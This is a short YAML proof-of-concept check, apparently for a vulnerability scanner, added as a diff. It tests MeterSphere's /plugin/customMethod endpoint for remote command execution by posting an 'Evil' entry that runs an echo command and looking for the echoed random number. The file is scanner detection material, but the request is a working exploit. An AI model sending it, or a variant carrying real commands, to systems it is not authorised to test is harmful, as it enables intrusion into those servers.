@@ -1,0 +1,27 @@
+name: poc-yaml-metersphere-plugincontroller-rce
+manual: true
+transport: http
+
+set:
+  s1: randomInt(800000000, 1000000000)
+
+rules:
+  r0:
+    request:
+      cache: true
+      method: POST
+      path: /plugin/customMethod
+      headers:
+        Content-Type: application/json
+        User-Agent: >-
+          Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/75.0.3770.100 Safari/537.36
+      body: '{"entry": "Evil", "request": "echo \"{{s1}}\""}'
+    expression: response.status == 200 && response.body.bcontains(bytes(string(s1)))
+
+expression: r0()
+
+detail:
+  author: we1x4n(https://we1x4n.com/)
+  links:
+    - https://xz.aliyun.com/t/10772
+  description: MeterSphere-远程命令执行漏洞
